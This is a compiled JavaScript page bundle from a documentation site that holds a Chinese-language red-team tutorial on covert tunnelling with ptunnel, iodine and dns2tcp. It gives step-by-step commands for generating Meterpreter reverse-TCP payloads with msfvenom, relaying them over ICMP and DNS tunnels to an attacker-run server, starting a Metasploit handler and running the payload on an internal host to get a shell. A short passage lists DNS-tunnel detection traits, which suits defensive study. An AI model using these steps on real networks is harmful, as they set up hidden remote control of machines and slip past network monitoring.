import{_ as e}from"./plugin-vue_export-helper-x3n3nnut.js";import{o as i,c as n,e as s}from"./app-RsCyfmdY.js";const a="/DailyNotes/assets/image-20231204182250798-geF0VRwt.png",t="/DailyNotes/assets/image-20231204180659967-JAkNWity.png",d="/DailyNotes/assets/image-20231204180954893-Cy1T35-E.png",l="/DailyNotes/assets/image-20231204181423774-LYYgoDSZ.png",r="/DailyNotes/assets/image-20231205131213945-kr6PdF9d.png",o="/DailyNotes/assets/image-20231205131228617-Bw0REM8T.png",c="/DailyNotes/assets/image-20231204182013245-M3yaQu5N.png",p="/DailyNotes/assets/image-20231205131401807-a3i5FuBT.png",u="/DailyNotes/assets/image-20231205140005738-7VESPvF4.png",g="/DailyNotes/assets/image-20231205140103703-lATBkpdX.png",m="/DailyNotes/assets/dnspod-pPlNwEu0.png",v="/DailyNotes/assets/port-1YeWZiWw.png",b="/DailyNotes/assets/server-jJQJ4ZMX.png",h="/DailyNotes/assets/ifconfig_server--SE7VCO5.png",f="/DailyNotes/assets/client-Wr3kkNVR.png",x="/DailyNotes/assets/ifconfig_client-LRJ6UNyP.png",_="/DailyNotes/assets/pingserver-PrD1GiTh.png",y="/DailyNotes/assets/ssh-jQkfjcvN.png",N="/DailyNotes/assets/ssh2-CRvxyDR6.png",D="/DailyNotes/assets/dns2tcp1-M6YCN52_.png",S="/DailyNotes/assets/dns2tcp2-CtxqL1VI.png",P="/DailyNotes/assets/dns2tcp3-RORBAvdp.png",k="/DailyNotes/assets/dns2tcp4-RMjjj2S_.png",z="/DailyNotes/assets/dns2tcp5-sEaHNvQ6.png",w="/DailyNotes/assets/dns2tcp6-J2fKNttY.png",I={},T=s(`<h1 id="内网隧道工具使用" tabindex="-1"><a class="header-anchor" href="#内网隧道工具使用" aria-hidden="true">#</a> 内网隧道工具使用</h1><h2 id="_1-icmp隧道" tabindex="-1"><a class="header-anchor" href="#_1-icmp隧道" aria-hidden="true">#</a> 1. ICMP隧道</h2><h3 id="_1-1-pingtunnel" tabindex="-1"><a class="header-anchor" href="#_1-1-pingtunnel" aria-hidden="true">#</a> 1.1 pingtunnel</h3><p>help信息如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ptunnel -h
ptunnel v 0.72.
Usage:   ptunnel -p &lt;addr&gt; -lp &lt;port&gt; -da &lt;dest_addr&gt; -dp &lt;dest_port&gt; [-m max_tunnels] [-v verbosity] [-f logfile]
         ptunnel [-m max_threads] [-v verbosity] [-c &lt;device&gt;]
     -p: Set address of peer running packet forwarder. This causes
         ptunnel to operate in forwarding mode - the absence of this
         option causes ptunnel to operate in proxy mode.
    -lp: Set TCP listening port (only used when operating in forward mode)
    -da: Set remote proxy destination address if client
         Restrict to only this destination address if server
    -dp: Set remote proxy destionation port if client
         Restrict to only this destination port if server
     -m: Set maximum number of concurrent tunnels
     -v: Verbosity level (-1 to 4, where -1 is no output, and 4 is all output)
     -c: Enable libpcap on the given device.
     -f: Specify a file to log to, rather than printing to standard out.
     -s: Client only. Enables continuous output of statistics (packet loss, etc.)
-daemon: Run in background, the PID will be written in the file supplied as argument
-syslog: Output debug to syslog instead of standard out.
   -udp: Toggle use of UDP instead of ICMP. Proxy will listen on port 53 (must be root).

Security features:  [-x password] [-u] [-setuid user] [-setgid group] [-chroot dir]
     -x: Set password (must be same on client and proxy)
     -u: Run proxy in unprivileged mode. This causes the proxy to forward
         packets using standard echo requests, instead of crafting custom echo replies.
         Unprivileged mode will only work on some systems, and is in general less reliable
         than running in privileged mode.
         Please consider combining the following three options instead:
-setuid: When started in privileged mode, drop down to user&#39;s rights as soon as possible
-setgid: When started in privileged mode, drop down to group&#39;s rights as soon as possible
-chroot: When started in privileged mode, restrict file access to the specified directory
-setcon: Set SELinux context when all there is left to do are network I/O operations
         To combine with -chroot you will have to \`mount --bind /proc /chrootdir/proc\`

Starting the proxy (needs to run as root):
 [root #] ptunnel
Starting a client (also needs root):
 [root #] ptunnel -p proxy.pingtunnel.com -lp 8000 -da login.domain.com -dp 22 -c eth0
And then using the tunnel to ssh to login.domain.com:
 [user $] ssh -p 8000 localhost
And that&#39;s it. Enjoy your tunnel!

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="上线msf" tabindex="-1"><a class="header-anchor" href="#上线msf" aria-hidden="true">#</a> 上线msf</h4><p>攻击机：开启ptunnel的server，将client端发过来的icmp流量解析成tcp的</p><p>靶机：开启ptunnel的client，监听本地的9999端口，ptunnel的client将9999端口接到的流量封装成icmp，发送到server端。</p><p><strong>1）攻击机操作：</strong></p><p>新生成msf马，然后放在靶机上</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=9999 -f elf -o exp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>攻击机开启msf监听，此处监听的4444端口，后面会用到</p><figure><img src="`+a+`" alt="image-20231204182250798" tabindex="0" loading="lazy"><figcaption>image-20231204182250798</figcaption></figure><p>攻击机开启ptunnel的server kali自带的，所以直接执行就可以</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ptunnel 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+t+`" alt="image-20231204180659967" tabindex="0" loading="lazy"><figcaption>image-20231204180659967</figcaption></figure><p><strong>2）靶机操作：</strong></p><p>靶机端执行client</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>./ptunnel -p 100.1.1.169 -lp 9999 -da 100.1.1.169 -dp 4444

# -p   server端的IP
# -lp  本地监听的端口（只要是这个端口接到的tcp流量，全部封装成icmp,发送到server端）
# -da -dp 告诉server端，解析后的流量转发到哪个ip和端口，这里填的是msf监听的IP和端口
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行可能报错</p><p><img src="`+d+`" alt="image-20231204180954893" loading="lazy">解决办法：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sudo yum install libpcap-devel
# 安装完可能版本不对
cd /usr/lib64/
ln -s libpcap.so.1.5.3 libpcap.so.0.8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+l+'" alt="image-20231204181423774" tabindex="0" loading="lazy"><figcaption>image-20231204181423774</figcaption></figure><p>靶机正常执行后效果如下：</p><figure><img src="'+r+'" alt="image-20231205131213945" tabindex="0" loading="lazy"><figcaption>image-20231205131213945</figcaption></figure><p>然后靶机执行msf马，server端会收到消息，从192.168.1.189接到了icmp流量，解析出来后发现需要转发到100.1.1.169的4444端口</p><figure><img src="'+o+'" alt="image-20231205131228617" tabindex="0" loading="lazy"><figcaption>image-20231205131228617</figcaption></figure><p>上线成功</p><figure><img src="'+c+'" alt="image-20231204182013245" tabindex="0" loading="lazy"><figcaption>image-20231204182013245</figcaption></figure><figure><img src="'+p+'" alt="image-20231205131401807" tabindex="0" loading="lazy"><figcaption>image-20231205131401807</figcaption></figure><p>上面的session看起来是攻击机的IP，其实ptunnel的server端转发过来的，只是ptunnel的server和msf放在同一个攻击机上而已。</p><h4 id="ptunnel流量分析" tabindex="-1"><a class="header-anchor" href="#ptunnel流量分析" aria-hidden="true">#</a> ptunnel流量分析</h4><p>先发送1个长度为70的request，然后又2个长度70的reply(内容固定)，接着就一直发送长度为1096的reply包，每秒为一个周期（可以对比下面两图的时间差）,流量包： <a href="img%5CTunnel%5Cptunnel_2.pcap">ptunnel_2.pcap</a> <a href="img%5CTunnel%5Cptunnel_1.pcap">ptunnel_1.pcap</a></p><figure><img src="'+u+'" alt="image-20231205140005738" tabindex="0" loading="lazy"><figcaption>image-20231205140005738</figcaption></figure><figure><img src="'+g+'" alt="image-20231205140103703" tabindex="0" loading="lazy"><figcaption>image-20231205140103703</figcaption></figure><h3 id="_1-2-icmptunnel" tabindex="-1"><a class="header-anchor" href="#_1-2-icmptunnel" aria-hidden="true">#</a> 1.2 icmptunnel</h3><h2 id="_2-dns隧道" tabindex="-1"><a class="header-anchor" href="#_2-dns隧道" aria-hidden="true">#</a> 2. DNS隧道</h2><p>2.1 DNS隧道原理</p><p>原理：配置某个域名的DNS服务器，使得对该域名的所有子域解析请求最终到达该NS服务器上，然后将另一个协议的数据编码为一系列DNS查询，响应时客户端将返回的Response数据进行解码得到另一协议的数据</p><p>特征：</p><p>DNS隧道建立后依靠不断发送query信息来判断隧道存活性 通过DNS隧道传输时，客户端将数据编码后作为主机名向DNS服务器提交，DNS服务端解码后读取数据 检测：</p><p>每个IP地址的DNS流量异常，DNS报文数量大 DNS消息中TXT或NULL等不常用的记录类型多 DNS消息中域名有部分固定不变 DNS服务器的地理位置异常 访问非受信的DNS服务器 基于请求域名长度及请求频率统计分析方法 dnscat 查询中包含了dnscat 字符串</p><h3 id="_2-1-iodine" tabindex="-1"><a class="header-anchor" href="#_2-1-iodine" aria-hidden="true">#</a> 2.1 iodine</h3><blockquote><p>以下的服务器和域名均来自腾讯云</p><p>服务器：https://cloud.tencent.com/product/cvm?from=10680</p><p>域名解析：https://cloud.tencent.com/product/cns?from=10680</p></blockquote><p>iodine是基于C语言开发的，分为服务端和客户端。iodine支持转发模式和中继模式。其原理是：通过TAP虚拟网卡，在服务端建立一个局域网，在客户端也通过TAP建立一个虚拟网卡，两者通过DNS隧道连接，处于同一个局域网(可以通过ping命令通信)。在客户端和服务器之间建立连接后，客户机上会多出一块名为dns0的虚拟网卡。</p><p>与同类工具相比，iodine具有如下特点：</p><blockquote><p>参考https://cloud.tencent.com/developer/article/1937092</p></blockquote><ul><li>不会对下行数据进行编码</li><li>支持多平台(Linux、Windows、MacOS)</li><li>支持16个并发连接</li><li>支持强密码机制</li><li>支持同网段隧道IP地质(不同于服务器一客户端网段)</li><li>支持多种DNS记录类型</li><li>提供了丰富的隧道质量检测措施</li></ul><h4 id="_1-部署域名解析" tabindex="-1"><a class="header-anchor" href="#_1-部署域名解析" aria-hidden="true">#</a> 1. 部署域名解析</h4><blockquote><p>https://console.dnspod.cn/</p></blockquote><p>首先，用一台公网的Linux系统的VPS作为C&amp;C服务器，并准备好一个可以配置的域名(这里我们假设是<code>dnslog1.site</code>)。然后配置域名的记录，如下：</p><figure><img src="'+m+`" alt="dnspod" tabindex="0" loading="lazy"><figcaption>dnspod</figcaption></figure><p>创建记录A，将自己的域名<code>dns.dnslog1.site</code>解析到VPS服务器地址。然后创建NS记录，将 <code>dns2tcp.dnslog1.site </code>指向 <code>dns.dnslog1.site </code>。</p><ul><li>第一条A类解析是在告诉域名系统，<code>dns.dnslog1.site</code>的IP地址是 <code>xx.xx.xx.xx</code> 。</li><li>第二条NS解析是在告诉域名系统，想要知道<code>dns2tcp.dnslog1.site</code>的IP地址，就去问<code>dns.dnslog1.site</code> 。</li></ul><p><strong>验证域名解析设置是否成功</strong></p><p>在随便一台电脑上ping域名<code>dns.dnslog1.site</code>，若能ping通，且显示的IP地址是我们配置的VPS的地址，说明第一条A类解析设置成功并已生效。</p><p>然后在我们的VPS上执行以下命令监听UDP 53端口</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code>tcpdump <span class="token operator">-</span>n <span class="token operator">-</span>i eth0 udp dst port <span class="token number">53</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在任意一台机器上执行 <code>nslookup dns2tcp.dnslog1.site </code>命令，如果在我们的VPS监听的端口有查询信息，说明第二条记录设置成功。</p><h4 id="_2-安装并启动服务端" tabindex="-1"><a class="header-anchor" href="#_2-安装并启动服务端" aria-hidden="true">#</a> 2. 安装并启动服务端</h4><p>提前检查VPS服务器防火墙的53端口是否打开：</p><figure><img src="`+v+`" alt="port" tabindex="0" loading="lazy"><figcaption>port</figcaption></figure><p>这里用的服务端是Centos7系统，可以执行安装命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>yum -y install iodine 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如果是Windows系统，可以安装编译好的对应版本的iodine。</p><p>执行以下命令启动服务端：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>iodined -f -c -P root@123456 172.16.10.1 dns2tcp.dnslog1.site -DD
    -f：在前台运行
    -c：禁止检查所有传入请求的客户端IP地址
    -P：指定密码
    -D：指定调试级别。-DD指第二级，D的数量随等级增加
    这里的172.16.10.1是自定义的局域网虚拟IP地址
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+b+'" alt="server" tabindex="0" loading="lazy"><figcaption>server</figcaption></figure><p>服务端启动成功后，VPS上多了一块dns0的网卡，ip为我们设置的172.16.10.1</p><figure><img src="'+h+`" alt="ifconfig_server" tabindex="0" loading="lazy"><figcaption>ifconfig_server</figcaption></figure><h4 id="_3-安装并启动客户端" tabindex="-1"><a class="header-anchor" href="#_3-安装并启动客户端" aria-hidden="true">#</a> 3. 安装并启动客户端</h4><p><strong>Windows系统</strong></p><p>如果是Windows系统，直接执行下面命令启动客户端，但是启动的过程中，会遇到杀毒软件的报毒，并且需要管理员权限执行命令才可以启动。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>iodine.exe -f -P root@123456 dns2tcp.dnslog1.site
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>Linux系统</strong></p><p>如果是Linux系统，先安装iodine。上传iodlie客户端到目标主机，解压，进入目录安装</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>cd iodine-0.7.0/
make &amp;&amp; make install
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>kali默认安装了iodine，执行下面命令连接服务端(需要root权限)，如图连接成功。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>iodine -f -P root@123456 dns2tcp.dnslog1.site
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+f+'" alt="client" tabindex="0" loading="lazy"><figcaption>client</figcaption></figure><p>连接成功后，客户端上新建了一个dns0的网卡，IP地址为172.16.10.2</p><figure><img src="'+x+'" alt="ifconfig_client" tabindex="0" loading="lazy"><figcaption>ifconfig_client</figcaption></figure><p>然后ping服务端地址</p><figure><img src="'+_+'" alt="pingserver" tabindex="0" loading="lazy"><figcaption>pingserver</figcaption></figure><h4 id="_4-使用dns隧道" tabindex="-1"><a class="header-anchor" href="#_4-使用dns隧道" aria-hidden="true">#</a> 4. 使用DNS隧道</h4><p>客户端和服务端连接成功后，由于客户端和服务端处在一个逻辑的局域网中，所以可以直接通。</p><p><strong>服务端SSH连接客户端</strong></p><figure><img src="'+y+'" alt="ssh" tabindex="0" loading="lazy"><figcaption>ssh</figcaption></figure><p><strong>客户端SSH连接服务端</strong></p><figure><img src="'+N+'" alt="ssh2" tabindex="0" loading="lazy"><figcaption>ssh2</figcaption></figure><hr><h3 id="_2-2-dns2tcp" tabindex="-1"><a class="header-anchor" href="#_2-2-dns2tcp" aria-hidden="true">#</a> 2.2 dns2tcp</h3><p>dns2tcp 是一个利用DNS隧道转发TCP连接的工具，使用C语言开发。</p><h4 id="_1-部署域名解析-1" tabindex="-1"><a class="header-anchor" href="#_1-部署域名解析-1" aria-hidden="true">#</a> 1. 部署域名解析</h4><figure><img src="'+D+`" alt="dns2tcp1" tabindex="0" loading="lazy"><figcaption>dns2tcp1</figcaption></figure><p><strong>验证域名解析设置是否成功</strong>，步骤同上。</p><h4 id="_2-安装并启动服务端-1" tabindex="-1"><a class="header-anchor" href="#_2-安装并启动服务端-1" aria-hidden="true">#</a> 2. 安装并启动服务端</h4><p>工具下载地址：https://github.com/alex-sector/dns2tcp</p><p>提前检查VPS服务器防火墙的53端口是否打开，将下载的工具上传到VPS，依次执行</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>unzip dns2tcp-master.zip
cd dns2tcp-master
./configure
make
make install
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>准备配置文件（腾讯云服务器不给实际网卡分配公网IP，所以要监听0.0.0.0）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>vim /etc/dns2tcpd.conf

listen = 0.0.0.0
port = 53
user = nobody
chroot = /var/empty/dns2tcp/
domain = a.dnslog1.site
resources = ssh:127.0.0.1:22,smtp:127.0.0.1:25,http:127.0.0.1:8080
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>完成后运行服务端：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>dns2tcpd  -F -d 1 -f /etc/dns2tcpd.conf
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+S+`" alt="dns2tcp2" tabindex="0" loading="lazy"><figcaption>dns2tcp2</figcaption></figure><h4 id="_3-安装并启动客户端-1" tabindex="-1"><a class="header-anchor" href="#_3-安装并启动客户端-1" aria-hidden="true">#</a> 3. 安装并启动客户端</h4><p>kali默认安装了dns2tcp，测试连接：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>dns2tcpc -z a.dnslog1.site &lt;服务器IP&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>其中&lt;服务器IP&gt;可选，服务端所在IP（DNS服务器IP）。不写将使用中继模式，否则使用直连模式，如果提示：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Available connection（s）:
        ssh
        smtp
        http
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>表示连接可用！</p><h4 id="_4-使用dns隧道-1" tabindex="-1"><a class="header-anchor" href="#_4-使用dns隧道-1" aria-hidden="true">#</a> 4. 使用DNS隧道</h4><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>dns2tcpc -l 4444 -r ssh  -z a.dnslog1.site &lt;服务器IP&gt; -c -d 3
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>-c表示启用数据压缩；-d表示启动调试，3为调试等级；-l表示监听本地端口，4444为端口名；-r为使用服务端上的哪个资源，ssh为资源名；-z后为前面配置的NS记录的域名。</p><figure><img src="`+P+`" alt="dns2tcp3" tabindex="0" loading="lazy"><figcaption>dns2tcp3</figcaption></figure><p>然后ssh连接本地4444端口就相当于连接服务端：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ssh root@127.0.0.1 -p 4444
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+k+`" alt="dns2tcp4" tabindex="0" loading="lazy"><figcaption>dns2tcp4</figcaption></figure><hr><p><strong>若需要将内网msf流量转发到外网：</strong></p><p>参考：https://blog.csdn.net/redwand/article/details/112727816</p><p>通过dns隧道嵌套ssh隧道实现本地端口转发：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ssh -CfNg -L 6666:&lt;服务器IP&gt;:6666 root@127.0.0.1 -p 4444
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+z+`" alt="dns2tcp5" tabindex="0" loading="lazy"><figcaption>dns2tcp5</figcaption></figure><p>生成木马，监听在客户端192.168.13.188的6666端口上</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.13.188 LPORT=6666 -f elf &gt; shell.elf
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务器打开msf，监听6666端口：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>msf6 &gt; use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp
payload =&gt; linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0
lhost =&gt; 0.0.0.0
msf6 exploit(multi/handler) &gt; set lport 6666
lport =&gt; 6666
msf6 exploit(multi/handler) &gt; run
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在内网的主机(这里选择另一台虚拟机192.168.13.100)运行shell.elf</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>chmod 777 shell.elf 
./shell.elf 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>成功得到上线meterpreter shell：</p><figure><img src="`+w+'" alt="dns2tcp6" tabindex="0" loading="lazy"><figcaption>dns2tcp6</figcaption></figure>',132),C=[T];function R(V,L){return i(),n("div",null,C)}const W=e(I,[["render",R],["__file","Tunnel.html.vue"]]);export{W as default};
